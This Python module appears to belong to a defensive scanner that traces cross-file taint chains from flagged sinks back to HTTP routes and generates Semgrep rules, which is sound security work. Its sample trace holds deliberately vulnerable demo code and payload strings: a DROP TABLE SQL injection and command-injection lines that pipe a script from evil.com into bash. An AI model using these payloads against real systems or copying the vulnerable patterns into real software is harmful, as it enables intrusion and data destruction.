"""
Call Graph Resolver — Cross-File Vulnerability Chain Detection (Python only)

Given:
  - call_graph: {"func_name|file_path": ["callee_func1", "callee_func2"]}
  - route_map:  {"func_name|file_path": {"method": "GET", "path": "/users/{id}", "params": ["user_id"]}}
  - vulnerable_wrappers: list of AI-flagged wrapper dicts with "function_name" and "file"

Produces:
  - promoted_wrappers: list of wrapper-like dicts that the Rule Generator can consume
  - verified_chains: list of full chain metadata for logging/UI
"""

import logging
from typing import Dict, Any, List, Tuple, Set, Optional
from collections import deque

logger = logging.getLogger(__name__)

MAX_CHAIN_DEPTH = 10


def resolve_vulnerable_chains(
    call_graph: Dict[str, List[str]],
    route_map: Dict[str, Dict[str, Any]],
    vulnerable_wrappers: List[Dict[str, Any]],
) -> Tuple[List[Dict[str, Any]], List[Dict[str, Any]]]:
    """
    Walk BACKWARDS from each vulnerable wrapper through the call graph
    to find all API routes that transitively reach the sink.

    Returns:
        promoted_wrappers: wrapper-like dicts to inject into LLM results for rule generation
        verified_chains:   full chain metadata for logging/UI display
    """
    if not call_graph or not vulnerable_wrappers:
        return [], []

    # ── Step 1: Build the set of vulnerable function names ──
    vuln_func_names: Set[str] = set()
    vuln_metadata: Dict[str, Dict[str, Any]] = {}  # func_name -> first wrapper's metadata
    for w in vulnerable_wrappers:
        fname = w.get("function_name", "")
        if fname and fname != "<module_global>":
            vuln_func_names.add(fname)
            if fname not in vuln_metadata:
                vuln_metadata[fname] = w

    if not vuln_func_names:
        return [], []

    # ── Step 2: Build reverse index (callee → set of caller keys) ──
    # call_graph maps "caller_func|file" → ["callee_func_name", ...]
    # We need: "callee_func_name" → set of "caller_func|file" keys
    reverse_index: Dict[str, Set[str]] = {}
    for caller_key, callees in call_graph.items():
        for callee_name in callees:
            reverse_index.setdefault(callee_name, set()).add(caller_key)

    # ── Step 3: BFS upward from each vulnerable function ──
    verified_chains: List[Dict[str, Any]] = []
    promoted_wrappers: List[Dict[str, Any]] = []
    seen_promotions: Set[str] = set()  # prevent duplicate promotions

    for vuln_func_name in vuln_func_names:
        original_wrapper = vuln_metadata[vuln_func_name]

        # BFS: each entry is (current_func_name, chain_so_far)
        queue: deque = deque()
        queue.append((vuln_func_name, [vuln_func_name]))
        visited: Set[str] = {vuln_func_name}

        while queue:
            current_name, chain = queue.popleft()

            if len(chain) > MAX_CHAIN_DEPTH:
                continue

            # Find all callers of current_name
            callers = reverse_index.get(current_name, set())

            for caller_key in callers:
                caller_func = caller_key.split("|")[0]
                caller_file = caller_key.split("|")[1] if "|" in caller_key else ""

                if caller_func in visited:
                    continue
                visited.add(caller_func)

                new_chain = [caller_func] + chain

                # Check if this caller is a route entry point
                if caller_key in route_map:
                    route_info = route_map[caller_key]
                    chain_record = {
                        "route": {
                            "func": caller_func,
                            "file": caller_file,
                            "method": route_info.get("method", ""),
                            "path": route_info.get("path", ""),
                            "params": route_info.get("params", []),
                        },
                        "chain": new_chain,
                        "sink": {
                            "func": vuln_func_name,
                            "file": original_wrapper.get("file", ""),
                            "vuln_type": original_wrapper.get("vulnerability_type", ""),
                            "severity": original_wrapper.get("severity", "MEDIUM"),
                        },
                        "depth": len(new_chain),
                    }
                    verified_chains.append(chain_record)
                    logger.info(
                        f"[CallGraph] Chain found: {' → '.join(new_chain)} "
                        f"({route_info.get('method', '?')} {route_info.get('path', '?')} "
                        f"→ {vuln_func_name} [{original_wrapper.get('vulnerability_type', '?')}])"
                    )

                # Promote this caller as a new wrapper (so Rule Generator creates rules for it)
                promotion_key = f"{caller_func}|{caller_file}"
                if promotion_key not in seen_promotions:
                    seen_promotions.add(promotion_key)
                    promoted_wrappers.append({
                        "function_name": caller_func,
                        "file": caller_file,
                        "cross_file": True,
                        "promoted_from": current_name,
                        "vulnerability_type": original_wrapper.get("vulnerability_type", ""),
                        "severity": original_wrapper.get("severity", "MEDIUM"),
                        "reason": (
                            f"Cross-file chain: {caller_func} transitively calls "
                            f"vulnerable function {vuln_func_name} "
                            f"({original_wrapper.get('vulnerability_type', 'unknown')})"
                        ),
                        "source_patterns": original_wrapper.get("source_patterns", []),
                        "sink_patterns": [f"{current_name}(...)"],
                        "sanitizer_patterns": original_wrapper.get("sanitizer_patterns", []),
                        "skip_sanitizer_patterns": [],
                        "vulnerable_parameter": "cross_file_taint",
                        "malicious_payload": original_wrapper.get("malicious_payload"),
                        "exploit_explanation": (
                            f"Untrusted input flows through {caller_func} in {caller_file}, "
                            f"which calls {vuln_func_name}, reaching a dangerous sink."
                        ),
                        "impact_summary": original_wrapper.get("impact_summary", ""),
                    })

                # Continue BFS upward
                queue.append((caller_func, new_chain))

    logger.info(
        f"[CallGraph] Resolution complete: "
        f"{len(verified_chains)} chain(s), {len(promoted_wrappers)} promotion(s)"
    )
    return promoted_wrappers, verified_chains


def generate_call_graph_trace(
    call_graph: Dict[str, List[str]],
    route_map: Dict[str, Dict[str, Any]],
    vulnerable_wrappers: List[Dict[str, Any]],
    max_steps: int = 200,
) -> Dict[str, Any]:
    """
    Simulate BFS call graph resolution and generate a rich, step-by-step
    execution trace for the visualizer.
    """
    if not call_graph and not vulnerable_wrappers:
        return get_sample_call_graph_trace()

    # 1. Forward Graph details
    forward_nodes = []
    forward_edges = []
    seen_nodes = set()

    for caller_key, callees in call_graph.items():
        caller_func = caller_key.split("|")[0]
        caller_file = caller_key.split("|")[1] if "|" in caller_key else ""
        is_route = caller_key in route_map
        route_info = route_map.get(caller_key, {})

        if caller_key not in seen_nodes:
            seen_nodes.add(caller_key)
            forward_nodes.append({
                "id": caller_key,
                "name": caller_func,
                "file": caller_file,
                "is_route": is_route,
                "route": route_info if is_route else None,
                "type": "route" if is_route else "function",
            })

        for callee in callees:
            forward_edges.append({
                "source": caller_key,
                "source_func": caller_func,
                "target": callee,
            })
            callee_id = f"{callee}|unknown"
            if callee not in seen_nodes and callee_id not in seen_nodes:
                seen_nodes.add(callee)
                forward_nodes.append({
                    "id": callee,
                    "name": callee,
                    "file": "",
                    "is_route": False,
                    "route": None,
                    "type": "callee",
                })

    # 2. Reverse Index Construction
    reverse_index: Dict[str, List[str]] = {}
    inverted_edges = []
    for caller_key, callees in call_graph.items():
        caller_func = caller_key.split("|")[0]
        for callee_name in callees:
            reverse_index.setdefault(callee_name, []).append(caller_key)
            inverted_edges.append({
                "source": callee_name,
                "target": caller_key,
                "target_func": caller_func,
            })

    for k in reverse_index:
        reverse_index[k] = sorted(list(set(reverse_index[k])))

    # 3. Vulnerable targets identification
    vuln_func_names: Set[str] = set()
    vuln_metadata: Dict[str, Dict[str, Any]] = {}
    vuln_targets_list = []

    for w in vulnerable_wrappers:
        fname = w.get("function_name", "")
        if fname and fname != "<module_global>":
            vuln_func_names.add(fname)
            if fname not in vuln_metadata:
                vuln_metadata[fname] = w
                vuln_targets_list.append({
                    "name": fname,
                    "file": w.get("file", ""),
                    "vulnerability_type": w.get("vulnerability_type", "Security Sink"),
                    "severity": w.get("severity", "HIGH"),
                    "reason": w.get("reason", ""),
                    "vulnerable_parameter": w.get("vulnerable_parameter", ""),
                })

    # 4. Atomic BFS Traversal
    bfs_steps: List[Dict[str, Any]] = []
    verified_chains: List[Dict[str, Any]] = []
    promoted_wrappers: List[Dict[str, Any]] = []
    seen_promotions: Set[str] = set()
    step_counter = 0

    def record_step(
        target_name: str,
        action: str,
        current_func: str,
        queue_snapshot: List[Tuple[str, List[str]]],
        visited_snapshot: Set[str],
        current_chain: List[str],
        caller_key: Optional[str] = None,
        is_visited: Optional[bool] = None,
        is_route: bool = False,
        route_info: Optional[Dict[str, Any]] = None,
        is_promoted: bool = False,
        explanation: str = "",
        code_snippet: str = "",
        active_edge: Optional[Dict[str, str]] = None,
    ):
        nonlocal step_counter
        if step_counter >= max_steps:
            return
        step_counter += 1

        caller_func = caller_key.split("|")[0] if caller_key else None
        caller_file = caller_key.split("|")[1] if (caller_key and "|" in caller_key) else None

        bfs_steps.append({
            "step": step_counter,
            "target_func": target_name,
            "action": action,
            "current_func": current_func,
            "caller_key": caller_key,
            "caller_func": caller_func,
            "caller_file": caller_file,
            "is_visited": is_visited,
            "is_route": is_route,
            "route_info": route_info,
            "is_promoted": is_promoted,
            "queue": [{"func": item[0], "depth": len(item[1]), "chain": item[1]} for item in queue_snapshot],
            "visited": sorted(list(visited_snapshot)),
            "current_chain": current_chain,
            "active_edge": active_edge,
            "verified_chains_count": len(verified_chains),
            "promoted_count": len(promoted_wrappers),
            "explanation": explanation,
            "code_snippet": code_snippet,
        })

    for vuln_func_name in vuln_func_names:
        if step_counter >= max_steps:
            break

        original_wrapper = vuln_metadata[vuln_func_name]
        queue: deque = deque()
        queue.append((vuln_func_name, [vuln_func_name]))
        visited: Set[str] = {vuln_func_name}

        record_step(
            target_name=vuln_func_name,
            action="START_TARGET",
            current_func=vuln_func_name,
            queue_snapshot=list(queue),
            visited_snapshot=visited,
            current_chain=[vuln_func_name],
            explanation=(
                f"Starting backward BFS from vulnerable sink '{vuln_func_name}' "
                f"({original_wrapper.get('vulnerability_type', 'Vulnerability')}). "
                f"Initialized Queue = ['{vuln_func_name}'], Visited = {{'{vuln_func_name}'}}."
            ),
            code_snippet=(
                f"queue = deque([('{vuln_func_name}', ['{vuln_func_name}'])])\n"
                f"visited = {{'{vuln_func_name}'}}"
            ),
        )

        while queue and step_counter < max_steps:
            current_name, chain = queue.popleft()

            record_step(
                target_name=vuln_func_name,
                action="DEQUEUE",
                current_func=current_name,
                queue_snapshot=list(queue),
                visited_snapshot=visited,
                current_chain=chain,
                explanation=f"Popped '{current_name}' from front of Queue (current depth: {len(chain)}).",
                code_snippet="current_name, chain = queue.popleft()",
            )

            if len(chain) > MAX_CHAIN_DEPTH:
                continue

            callers = reverse_index.get(current_name, [])

            record_step(
                target_name=vuln_func_name,
                action="LOOKUP_REVERSE",
                current_func=current_name,
                queue_snapshot=list(queue),
                visited_snapshot=visited,
                current_chain=chain,
                explanation=(
                    f"Lookup reverse index for callers of '{current_name}': "
                    f"found {len(callers)} caller(s) "
                    f"{'(' + ', '.join(callers[:3]) + '...)' if len(callers) > 3 else callers}."
                ),
                code_snippet=f"callers = reverse_index.get('{current_name}', set())",
            )

            for caller_key in callers:
                if step_counter >= max_steps:
                    break

                caller_func = caller_key.split("|")[0]
                caller_file = caller_key.split("|")[1] if "|" in caller_key else ""
                already_visited = caller_func in visited

                if already_visited:
                    record_step(
                        target_name=vuln_func_name,
                        action="CYCLE_SKIPPED",
                        current_func=current_name,
                        caller_key=caller_key,
                        is_visited=True,
                        queue_snapshot=list(queue),
                        visited_snapshot=visited,
                        current_chain=chain,
                        active_edge={"source": current_name, "target": caller_func},
                        explanation=f"Caller '{caller_func}' in '{caller_file}' was already visited. Skipping to prevent cycle/infinite loop.",
                        code_snippet=f"if '{caller_func}' in visited: continue",
                    )
                    continue

                visited.add(caller_func)
                new_chain = [caller_func] + chain
                is_route = caller_key in route_map
                route_info = route_map.get(caller_key) if is_route else None

                if is_route and route_info:
                    chain_record = {
                        "route": {
                            "func": caller_func,
                            "file": caller_file,
                            "method": route_info.get("method", "ROUTE"),
                            "path": route_info.get("path", "/"),
                            "params": route_info.get("params", []),
                        },
                        "chain": new_chain,
                        "sink": {
                            "func": vuln_func_name,
                            "file": original_wrapper.get("file", ""),
                            "vuln_type": original_wrapper.get("vulnerability_type", ""),
                            "severity": original_wrapper.get("severity", "MEDIUM"),
                        },
                        "depth": len(new_chain),
                    }
                    verified_chains.append(chain_record)

                    record_step(
                        target_name=vuln_func_name,
                        action="ROUTE_MATCH",
                        current_func=current_name,
                        caller_key=caller_key,
                        is_visited=False,
                        is_route=True,
                        route_info=route_info,
                        queue_snapshot=list(queue),
                        visited_snapshot=visited,
                        current_chain=new_chain,
                        active_edge={"source": current_name, "target": caller_func},
                        explanation=(
                            f"🎉 MATCHED ROUTE ENTRY POINT! '{caller_func}' in '{caller_file}' "
                            f"is decorated with {route_info.get('method', 'GET')} '{route_info.get('path', '/')}'. "
                            f"Discovered full attack chain ({len(new_chain)} hops): {' → '.join(new_chain)}."
                        ),
                        code_snippet=(
                            f"if '{caller_key}' in route_map:\n"
                            f"    verified_chains.append(chain_record)"
                        ),
                    )

                promotion_key = f"{caller_func}|{caller_file}"
                was_promoted = False
                if promotion_key not in seen_promotions:
                    seen_promotions.add(promotion_key)
                    was_promoted = True
                    promoted_wrappers.append({
                        "function_name": caller_func,
                        "file": caller_file,
                        "cross_file": True,
                        "promoted_from": current_name,
                        "vulnerability_type": original_wrapper.get("vulnerability_type", ""),
                        "severity": original_wrapper.get("severity", "MEDIUM"),
                        "reason": f"Transitively calls vulnerable sink '{vuln_func_name}'",
                    })

                queue.append((caller_func, new_chain))

                record_step(
                    target_name=vuln_func_name,
                    action="ENQUEUE_CALLER",
                    current_func=current_name,
                    caller_key=caller_key,
                    is_visited=False,
                    is_route=is_route,
                    route_info=route_info,
                    is_promoted=was_promoted,
                    queue_snapshot=list(queue),
                    visited_snapshot=visited,
                    current_chain=new_chain,
                    active_edge={"source": current_name, "target": caller_func},
                    explanation=(
                        f"Enqueued '{caller_func}' to Queue with chain depth {len(new_chain)}. "
                        + (f"Promoted '{caller_func}' for Semgrep rule generation." if was_promoted else "")
                    ),
                    code_snippet=f"queue.append(('{caller_func}', {new_chain}))",
                )

        record_step(
            target_name=vuln_func_name,
            action="TARGET_COMPLETE",
            current_func=vuln_func_name,
            queue_snapshot=[],
            visited_snapshot=visited,
            current_chain=[],
            explanation=f"Completed BFS traversal for vulnerable sink '{vuln_func_name}'.",
            code_snippet="# BFS walk complete for target",
        )

    return {
        "forward_graph": {
            "nodes": forward_nodes,
            "edges": forward_edges,
            "adjacency_list": call_graph,
            "total_callers": len(call_graph),
            "total_edges": len(forward_edges),
            "total_routes": len(route_map),
        },
        "reverse_index": {
            "mapping": reverse_index,
            "inverted_edges": inverted_edges,
            "total_callees": len(reverse_index),
        },
        "vulnerable_targets": vuln_targets_list,
        "bfs_steps": bfs_steps,
        "verified_chains": verified_chains,
        "promoted_wrappers": promoted_wrappers,
        "summary": {
            "total_chains": len(verified_chains),
            "total_promoted": len(promoted_wrappers),
            "total_nodes": len(forward_nodes),
            "total_edges": len(forward_edges),
            "max_depth": max([c["depth"] for c in verified_chains]) if verified_chains else 0,
        },
        "is_sample": False,
    }


def get_sample_call_graph_trace() -> Dict[str, Any]:
    """
    Produce a rich, realistic sample BFS call graph trace with full hop-by-hop source code,
    Semgrep rules, and core detection engine algorithms.
    """
    sample_call_graph = {
        "get_user_profile|routes/user_routes.py": ["fetch_user", "audit_log"],
        "export_user_report|routes/admin_routes.py": ["generate_report_archive", "verify_admin_token"],
        "fetch_user|services/user_service.py": ["run_custom_query", "normalize_user_id"],
        "generate_report_archive|services/report_service.py": ["execute_system_command"],
        "run_custom_query|db/db_helper.py": ["execute_raw_sql"],
        "execute_system_command|utils/os_helper.py": ["system_exec"],
    }

    sample_route_map = {
        "get_user_profile|routes/user_routes.py": {
            "method": "GET",
            "path": "/api/v1/users/{user_id}",
            "params": ["user_id"],
        },
        "export_user_report|routes/admin_routes.py": {
            "method": "POST",
            "path": "/api/v1/admin/export",
            "params": ["archive_name", "format"],
        },
    }

    sample_vulnerable_wrappers = [
        {
            "function_name": "run_custom_query",
            "file": "db/db_helper.py",
            "vulnerability_type": "SQL Injection",
            "severity": "HIGH",
            "reason": "Direct SQL string concatenation without parameterization",
            "vulnerable_parameter": "user_id",
            "malicious_payload": "' OR 1=1; DROP TABLE users; --",
            "exploit_explanation": "Untrusted user_id passes from route GET /api/v1/users/{user_id} -> fetch_user -> run_custom_query and is concatenated directly into SQL cursor.execute().",
            "impact_summary": "Full database compromise, unauthorized data extraction and deletion.",
        },
        {
            "function_name": "execute_system_command",
            "file": "utils/os_helper.py",
            "vulnerability_type": "Command Injection",
            "severity": "CRITICAL",
            "reason": "Direct execution of shell command using os.system without shell sanitization",
            "vulnerable_parameter": "archive_name",
            "malicious_payload": "; curl evil.com/exfil.sh | bash",
            "exploit_explanation": "Untrusted parameter archive_name flows from POST /api/v1/admin/export -> generate_report_archive -> execute_system_command reaching os.system.",
            "impact_summary": "Remote arbitrary code execution on backend server with host compromise.",
        },
    ]

    trace = generate_call_graph_trace(
        call_graph=sample_call_graph,
        route_map=sample_route_map,
        vulnerable_wrappers=sample_vulnerable_wrappers,
    )
    trace["is_sample"] = True

    # Enrich verified chains with hop-by-hop source code and Semgrep rules
    if len(trace.get("verified_chains", [])) >= 2:
        # Chain 1: SQL Injection
        trace["verified_chains"][0]["title"] = "Cross-File SQL Injection via User Profile Route"
        trace["verified_chains"][0]["malicious_payload"] = "' OR 1=1; DROP TABLE users; --"
        trace["verified_chains"][0]["impact"] = "Full database compromise, unauthorized extraction and deletion of all table data."
        trace["verified_chains"][0]["hops_code"] = [
            {
                "step": 1,
                "role": "HTTP Route Entry Point (Taint Source)",
                "function": "get_user_profile",
                "file": "routes/user_routes.py",
                "code": """# routes/user_routes.py
@app.get("/api/v1/users/{user_id}")
def get_user_profile(user_id: str):
    # [SOURCE] Untrusted user input enters here from HTTP request parameter
    audit_log(f"Fetching profile for {user_id}")
    return fetch_user(user_id)""",
                "explanation": "Client sends user_id as a URL path parameter. It enters the application unsanitized and is passed directly to the service layer."
            },
            {
                "step": 2,
                "role": "Intermediate Service Layer (Taint Propagation)",
                "function": "fetch_user",
                "file": "services/user_service.py",
                "code": """# services/user_service.py
def fetch_user(uid: str):
    # [PROPAGATION] uid passes straight through without validation
    normalized_id = normalize_user_id(uid)
    return run_custom_query(normalized_id)""",
                "explanation": "The service layer accepts uid and forwards it to the database helper function without input sanitization or parameter binding."
            },
            {
                "step": 3,
                "role": "Vulnerable Security Sink",
                "function": "run_custom_query",
                "file": "db/db_helper.py",
                "code": """# db/db_helper.py
def run_custom_query(query_param: str):
    # [DANGEROUS SINK] Direct string interpolation into raw SQL query!
    sql = f"SELECT * FROM users WHERE id = '{query_param}'"
    return execute_raw_sql(sql)""",
                "explanation": "Untrusted parameter is concatenated directly into SQL statement, resulting in CWE-89 SQL Injection."
            }
        ]
        trace["verified_chains"][0]["generated_rule_yaml"] = """rules:
  - id: fixora-crossfile-user-profile-sqli
    mode: taint
    languages: [python]
    severity: ERROR
    message: "Cross-file SQL Injection: User input from get_user_profile() reaches cursor in run_custom_query()"
    pattern-sources:
      - pattern: def get_user_profile($USER_ID, ...): ...
    pattern-sinks:
      - pattern: run_custom_query(...)
      - pattern: execute_raw_sql(...)
    metadata:
      cwe: ["CWE-89"]
      owasp: ["A03:2021 - Injection"]
      cross_file: true
      attack_chain: "get_user_profile -> fetch_user -> run_custom_query" """

        # Chain 2: Command Injection
        trace["verified_chains"][1]["title"] = "Cross-File Remote Command Injection via Admin Export Route"
        trace["verified_chains"][1]["malicious_payload"] = "; curl evil.com/pwn.sh | bash"
        trace["verified_chains"][1]["impact"] = "Arbitrary command execution on backend server with host compromise and shell access."
        trace["verified_chains"][1]["hops_code"] = [
            {
                "step": 1,
                "role": "HTTP Route Entry Point (Taint Source)",
                "function": "export_user_report",
                "file": "routes/admin_routes.py",
                "code": """# routes/admin_routes.py
@app.post("/api/v1/admin/export")
def export_user_report(archive_name: str, format: str):
    # [SOURCE] User controls archive_name via POST body
    verify_admin_token(request)
    return generate_report_archive(archive_name)""",
                "explanation": "User-supplied archive_name from POST body is forwarded into report generator without filename validation."
            },
            {
                "step": 2,
                "role": "Intermediate Service Layer (Taint Propagation)",
                "function": "generate_report_archive",
                "file": "services/report_service.py",
                "code": """# services/report_service.py
def generate_report_archive(archive_name: str):
    # [PROPAGATION] Formulates shell command string with tainted parameter
    cmd = f"tar -czf /tmp/archives/{archive_name}.tar.gz /data/exports"
    return execute_system_command(cmd)""",
                "explanation": "Constructs a shell command string using raw string formatting with the tainted archive name."
            },
            {
                "step": 3,
                "role": "Vulnerable Security Sink",
                "function": "execute_system_command",
                "file": "utils/os_helper.py",
                "code": """# utils/os_helper.py
def execute_system_command(cmd: str):
    # [DANGEROUS SINK] Passes unsanitized command directly to shell
    return system_exec(cmd)  # internally executes os.system(cmd)""",
                "explanation": "Executes shell command with os.system. Supplying '; curl evil.com | bash' leads to Remote Command Execution (CWE-78)."
            }
        ]
        trace["verified_chains"][1]["generated_rule_yaml"] = """rules:
  - id: fixora-crossfile-export-command-injection
    mode: taint
    languages: [python]
    severity: CRITICAL
    message: "Cross-file Command Injection: Untrusted archive_name in export_user_report() reaches os.system()"
    pattern-sources:
      - pattern: def export_user_report($NAME, ...): ...
    pattern-sinks:
      - pattern: execute_system_command(...)
      - pattern: system_exec(...)
    metadata:
      cwe: ["CWE-78"]
      owasp: ["A03:2021 - Injection"]
      cross_file: true
      attack_chain: "export_user_report -> generate_report_archive -> execute_system_command" """

    # Add the 4 core detection algorithms with real Python code
    trace["engine_algorithms"] = [
        {
            "id": "ast_extractor",
            "title": "1. AST Forward Call Graph & Route Extractor",
            "file": "backend/services/github_scan_service.py",
            "description": "Parses every Python file into an Abstract Syntax Tree (ast.parse). Detects HTTP framework route decorators (@app.get, @app.post, etc.) and extracts every internal function call to construct the forward adjacency list.",
            "code": """def build_python_call_graph(scan_root, display_root):
    ROUTE_METHODS = {"get", "post", "put", "delete", "patch", "route"}
    call_graph = {}
    route_map = {}

    for fp in _iter_python_files(scan_root):
        tree = ast.parse(open(fp).read())
        rel = os.path.relpath(fp, display_root)
        
        for node in ast.walk(tree):
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                func_key = f"{node.name}|{rel}"
                
                # Detect HTTP Route Decorators
                for dec in node.decorator_list:
                    if isinstance(dec, ast.Call):
                        method = dec.func.attr.lower()
                        if method in ROUTE_METHODS:
                            route_map[func_key] = {
                                "method": method.upper(),
                                "path": dec.args[0].value,
                                "params": [a.arg for a in node.args.args]
                            }
                
                # Extract internal calls
                calls = {c.func.id for c in ast.walk(node) if isinstance(c, ast.Call)}
                call_graph[func_key] = sorted(calls)
                
    return call_graph, route_map"""
        },
        {
            "id": "index_inversion",
            "title": "2. Graph Inversion (Reverse Index Construction)",
            "file": "backend/services/call_graph_resolver.py",
            "description": "Inverts the forward call graph. Transforms caller -> [callees] into callee -> [caller_keys]. This allows O(1) backward queries: finding all functions that call a dangerous sink without scanning the entire repo.",
            "code": """def build_reverse_index(call_graph: Dict[str, List[str]]) -> Dict[str, Set[str]]:
    # Invert edges: callee_name -> set of caller keys
    reverse_index = {}
    for caller_key, callees in call_graph.items():
        for callee_name in callees:
            reverse_index.setdefault(callee_name, set()).add(caller_key)
            
    # Example:
    # reverse_index["run_custom_query"] = {"fetch_user|services/user_service.py"}
    return reverse_index"""
        },
        {
            "id": "bfs_engine",
            "title": "3. Backward BFS Upward Traversal Engine",
            "file": "backend/services/call_graph_resolver.py",
            "description": "Initializes a FIFO queue with each AI-flagged vulnerable sink. Traverses upward through callers. Uses a visited set to prevent infinite cycles. If a caller is found in route_map, a complete attack chain is verified!",
            "code": """def resolve_vulnerable_chains(call_graph, route_map, vulnerable_wrappers):
    reverse_index = build_reverse_index(call_graph)
    verified_chains = []
    
    for vuln in vulnerable_wrappers:
        sink_name = vuln["function_name"]
        queue = deque([(sink_name, [sink_name])])
        visited = {sink_name}
        
        while queue:
            current_name, chain = queue.popleft()
            if len(chain) > 10: continue
            
            callers = reverse_index.get(current_name, set())
            for caller_key in callers:
                caller_func = caller_key.split("|")[0]
                if caller_func in visited: continue
                visited.add(caller_func)
                
                new_chain = [caller_func] + chain
                
                # Check if entry point is reached!
                if caller_key in route_map:
                    verified_chains.append({
                        "route": route_map[caller_key],
                        "chain": new_chain,
                        "sink": vuln,
                        "depth": len(new_chain)
                    })
                    
                queue.append((caller_func, new_chain))
    return verified_chains"""
        },
        {
            "id": "rule_promotion",
            "title": "4. Dynamic Wrapper Promotion & Semgrep Rule Synthesis",
            "file": "backend/services/rule_generator.py",
            "description": "Every intermediate function along the verified attack path is dynamically promoted into a Semgrep wrapper rule. This bridges the cross-file gap, allowing Semgrep's taint analyzer to follow user parameters across files into the dangerous sink.",
            "code": """def promote_and_generate_rules(chain_record):
    promoted = []
    for func in chain_record["chain"][:-1]:
        promoted.append({
            "function_name": func,
            "cross_file": True,
            "vulnerability_type": chain_record["sink"]["vuln_type"],
            "sink_patterns": [f"{func}(...)"]
        })
        
    # Synthesize Semgrep YAML rule:
    rule_yaml = f\"\"\"
rules:
  - id: fixora-crossfile-{chain_record['sink']['func']}
    mode: taint
    pattern-sources:
      - pattern: {chain_record['route']['func']}(...)
    pattern-sinks:
      - pattern: {chain_record['sink']['func']}(...)
    message: "Cross-file taint path detected: {' -> '.join(chain_record['chain'])}"
\"\"\"
    return rule_yaml"""
        }
    ]

    return trace

